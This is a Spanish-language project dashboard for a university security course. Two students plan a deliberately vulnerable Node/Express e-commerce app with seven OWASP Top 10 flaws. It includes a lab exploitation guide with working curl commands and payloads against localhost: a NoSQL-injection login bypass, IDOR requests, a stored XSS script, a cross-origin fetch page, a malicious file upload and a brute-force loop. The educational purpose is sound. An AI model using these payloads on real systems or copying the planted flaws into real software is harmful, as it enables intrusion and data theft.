# 🚀 Project Manager Dashboard: Aplicación Web Educativa con Vulnerabilidades Intencionales OWASP Top 10

Este dashboard es la herramienta principal para la gestión, seguimiento y documentación del proyecto.

---

## 📋 Información del Proyecto

| Atributo | Detalle |
| :--- | :--- |
| **Profesor** | Misael Matamoros Soto |
| **Peso** | 20% de la nota final |
| **Modalidad** | Trabajo en parejas |
| **Duración** | 3 semanas |
| **Nombre del equipo** | **MandarinBytes** |
| **Integrante 1** | Sebastián Valverde |
| **Integrante 2** | Guoliang Li |
| **Repositorio Git** | `https://github.com/GuoliangLi9104/ITI922-Proyecto-1.git` |
| **Stack Elegido** | **Node.js + Express + Mongoose (MongoDB Atlas) + Vanilla JS** |

---

## 🎯 Objetivos del Proyecto

* Implementar **mínimo 6 vulnerabilidades OWASP Top 10** intencionales (edición 2017/2021).
* Demostrar la explotación controlada durante la defensa presencial.
* Proponer mitigaciones efectivas para cada vulnerabilidad.
* Entregar documentación técnica profesional y un historial de Git coherente.

### 🧩 Alcance Técnico Requerido (E-commerce Vulnerable)

| Requisito | Estado |
| :--- | :--- |
| Propósito funcional definido (E-commerce) | ✅ |
| Sistema de autenticación de usuarios | **(En Desarrollo)** |
| Mínimo 3 funcionalidades principales (Auth, Productos, Carrito/Órdenes) | **(En Desarrollo)** |
| Base de datos (Mongoose Atlas) | ✅ |
| Stack: HTML, CSS, JavaScript + backend framework (Node/Express) | ✅ |
| Software libre/open source exclusivamente | ✅ |
| Multiplataforma (Node.js) | ✅ |
| Git con commits frecuentes y descriptivos | ✅ |

---

## 📅 Cronograma de Fases (Estado Actual)

### Fase 1: Planificación (Semana 1)

| Hito | Estado |
| :--- | :--- |
| Definir nombre de fantasía del equipo | ✅ |
| Crear repositorio Git privado | ✅ |
| Invitar al compañero de equipo al repositorio | ✅ |
| Redactar idea base de la aplicación (E-commerce) | ✅ |
| Seleccionar 6+ vulnerabilidades OWASP Top 10 a implementar | ✅ |
| Definir roles y responsabilidades (Ambos Full-Stack + Focus Docs/QA) | ✅ |
| Crear cronograma semanal detallado con hitos | ✅ |
| Diseñar arquitectura básica de la aplicación | ✅ |
| Definir stack tecnológico específico (Node/Express/Mongoose) | ✅ |

### Fase 2: Desarrollo e Implementación (Semanas 2-3)

| Hito | Estado | Responsable |
| :--- | :--- | :--- |
| Configurar base de datos (esquema inicial: User, Product, Cart, Order, Review) | ✅ | Guoliang |
| Documentar evidencia técnica (capturas, logs) | ⬜ | Ambos |
| Desarrollar funcionalidad principal #3 (Checkout/Órdenes) | ⬜ | Sebastián |
| Insertar vulnerabilidades #3, #4, #5 y #6 | ⬜ | Ambos |
| Probar todas las explotaciones (Demo Script Testing) | ⬜ | Ambos (QA) |
| Refinar interfaz de usuario (Opcional) | ⬜ | Sebastián |
| Registrar ubicación exacta en código de cada vulnerabilidad (`vuln_catalog.md`) | ⬜ | Guoliang |

### Fase 3: Documentación y Defensa (Semana 3)

| Hito | Estado |
| :--- | :--- |
| Redactar sección: Descripción del Proyecto | ⬜ |
| Redactar sección: Instrucciones de Despliegue | ⬜ |
| Catálogo de vulnerabilidades (`vuln_catalog.md`) completo | ⬜ |
| Distribución de tareas y estadísticas de commits | ⬜ |
| Revisar calidad del código | ⬜ |
| Preparar carpeta `/docs` con evidencias | ⬜ |
| Preparar presentación técnica (10-15 min) | ⬜ |
| Crear script de demostración del funcionamiento normal (5 min) | ⬜ |
| Preparar demostración de explotación de vulnerabilidades (10 min) | ⬜ |
| Preparar entorno de demo y backup | ⬜ |

---

## 🛡️ Vulnerabilidades OWASP a Implementar (Confirmadas)

| # | Nombre de Vulnerabilidad | Tipo OWASP (2021) | Implementación Prevista | Archivo(s) Clave |
| :--- | :--- | :--- | :--- | :--- |
| 1 | **NoSQL Injection** | A03: Injection | Uso directo de `req.body` en `User.findOne()` sin sanitizar. | `src/controllers/auth.js` |
| 2 | **Sensitive Data Exposure** | A02: Cryptographic Failures | Almacenamiento de `password` en **texto plano**. | `src/models/User.js` |
| 3 | **Broken Access Control / IDOR** | A01: Broken Access Control | Acceso a recursos por `userId` o `orderId` sin verificar el propietario. | `src/routes/cart.js`, `src/routes/orders.js` |
| 4 | **Cross-Site Scripting (XSS)** | A03: Injection | Datos de usuario (ej. `description`, `content`) sin sanitizar al guardar/renderizar. | `src/models/Product.js`, `src/models/Review.js` |
| 5 | **Security Misconfiguration** | A05: Security Misconfiguration | CORS abierto, cookies inseguras, falta de **Helmet**. | `src/index.js` |
| 6 | **Insecure File Upload** | A04: Insecure Design | Subida de archivos sin validación de MIME/tamaño. | `src/controllers/product.js` |
| *(Extra)* | Authentication Failures | A07: Identification and Authentication Failures | Falta de *rate limiting* en login. | `src/controllers/auth.js` |

---

## 🧪 Guía de Explotación Controlada

> **⚠️ Importante:** Ejecuta estas pruebas únicamente en entornos de laboratorio. Cada escenario confirma fallas intencionales pensadas para la defensa del proyecto y no debe activarse en producción.

### 1. NoSQL Injection · `POST /api/users/login`
1. Levanta el backend (`npm install && npm start` dentro de `backend/src`).
2. Registra un usuario legítimo o reutiliza uno existente para que la colección tenga documentos.
3. Envía un JSON con operadores NoSQL en vez de credenciales válidas:
   ```bash
   curl -X POST http://localhost:3000/api/users/login \
     -H "Content-Type: application/json" \
     -d '{"username":{"$ne":null},"password":{"$ne":null}}'
   ```
4. El endpoint responde `200 OK` y devuelve un usuario aun cuando no se proporcionó su contraseña, probando la inyección.

### 2. Sensitive Data Exposure · Contraseñas en texto plano
1. Desde `/api/users/register` crea una cuenta de prueba con una contraseña reconocible.
2. Obtén `MONGO_URI` del `.env` y conéctate con `mongosh` (o Compass):
   ```bash
   mongosh "mongodb+srv://usuario:clave@cluster.mongodb.net/proyecto"
   ```
3. Consulta la colección:
   ```javascript
   db.users.find({}, { username: 1, password: 1 }).pretty()
   ```
4. Observa que el campo `password` almacena el valor original sin hashing ni cifrado, exponiendo datos sensibles.

### 3. Broken Access Control / IDOR · Recursos por `userId`
1. Crea dos usuarios (Victim y Attacker) y registra productos en ambos carritos mediante `POST /api/cart`.
2. Copia el `userId` de la víctima (se devuelve al registrarla).
3. Como atacante, consulta o modifica recursos ajenos sin autenticación:
   ```bash
   curl http://localhost:3000/api/cart/<victimId>
   curl -X PUT http://localhost:3000/api/orders/<orderId> -H "Content-Type: application/json" -d '{"status":"paid"}'
   ```
4. El backend responde con los datos de la víctima o actualiza órdenes que no pertenecen al atacante, demostrando el IDOR.

### 4. Stored XSS · Campos `description` y `comment`
1. Inserta un payload HTML persistente:
   ```bash
   curl -X POST http://localhost:3000/api/reviews \
     -H "Content-Type: application/json" \
     -d '{"productId":"<id>","userId":"<attacker>","rating":5,"comment":"<script>alert(\"xss\")</script>"}'
   ```
   *(También funciona con `description` en `/api/products`.)*
2. Abre la vista del front (o consulta `/api/reviews/<productId>`) para que el navegador renderice la reseña.
3. El `script` se ejecuta en cualquier sesión que consuma ese contenido, confirmando XSS almacenado.

### 5. Security Misconfiguration · CORS abierto y sin cabeceras duras
1. Crea un archivo `exploit.html` fuera del proyecto:
   ```html
   <script>
     fetch('http://localhost:3000/api/orders')
       .then(r => r.json())
       .then(data => document.body.innerText = JSON.stringify(data, null, 2));
   </script>
   ```
2. Sirve el archivo con `npx http-server . -p 8081` (o ábrelo con `file://`).
3. Al cargarlo en el navegador, la petición cross-origin se completa porque `cors()` permite `*` y no hay Helmet/headers restrictivos.
4. En la página se muestran los pedidos obtenidos desde un origen no confiable, probando la mala configuración.

### 6. Insecure File Upload · `POST /api/products` sin validación
1. Prepara un archivo malicioso (`payload.html`, `reverse_shell.php`, etc.).
2. Súbelo como si fuese una imagen:
   ```bash
   curl -X POST http://localhost:3000/api/products \
     -F "name=Evil Product" \
     -F "price=1" \
     -F "image=@payload.html"
   ```
3. El backend responde `201` y almacena el archivo sin revisar extensión, tamaño ni MIME.
4. Accede a `http://localhost:3000/uploads/products/<nombre-devuelto>` para descargar/ejecutar el payload directamente desde el servidor.

### 7. Authentication Failures (Extra) · Sin rate limiting
1. Localiza credenciales de un usuario objetivo (solo para demo).
2. Ejecuta un script de fuerza bruta contra `/api/users/login`:
   ```bash
   while true; do
     curl -s -X POST http://localhost:3000/api/users/login \
       -H "Content-Type: application/json" \
       -d '{"username":"victim","password":"'$(openssl rand -hex 2)'"}' >/dev/null
   done
   ```
3. Observa que no existe bloqueo temporal, contador ni CAPTCHA: se admiten intentos ilimitados, lo que facilita ataques de credenciales.

---

## 📊 Rubros de Evaluación (100 pts)

*Revisar regularmente para asegurar cumplimiento.*

| Rubro | Pts | Estado | Nota del PM |
| :--- | :--- | :--- | :--- |
| 1. Aplicación Funcional | 20 | ⬜ | Se debe validar el front-end opcional. |
| 2. Vulnerabilidades Implementadas (Mínimo 6) | 25 | ✅ (Confirmadas 7) | Buen nivel de diversidad OWASP. |
| 3. Documentación Técnica | 20 | ⬜ | Prioridad de la Semana 3. Enfocarse en el catálogo. |
| 4. Control de Versiones - Git | 10 | ✅ | Mantener frecuencia diaria de commits. |
| 5. Defensa y Demostración | 20 | ⬜ | Iniciar ensayo de demo pronto. |
| 6. Calidad del Código (Excepto vulnerabilidades) | 5 | ⬜ | Usar ESLint/Prettier. |

---

## 📁 Estructura del Repositorio (Confirmada)

## 💬 Comunicación y Gestión

### Log Semanal de Progreso

| Semana | Fecha | Avances Clave | Pendientes Críticos | Bloqueadores |
| :--- | :--- | :--- | :--- | :--- |
| 1 | [Definir Fecha] | Planificación completa, selección de stack y vulnerabilidades. Estructura de carpetas creada. | Implementación de Modelos y Rutas de Autenticación. | Ninguno. |
| 2 | [Definir Fecha] | [Avances de la semana] | [Pendientes de la semana] | [Bloqueadores] |
| 3 | [Definir Fecha] | [Avances de la semana] | [Pendientes de la semana] | [Bloqueadores] |

### Reuniones de Equipo
* **Frecuencia:** Semanal (20-30 minutos).
* **Formato:** Presencial o videollamada.
* **Herramientas:** Discord/WhatsApp para comunicación diaria.

---
**Meta de puntuación: 90-100 puntos (Excelente)**
---
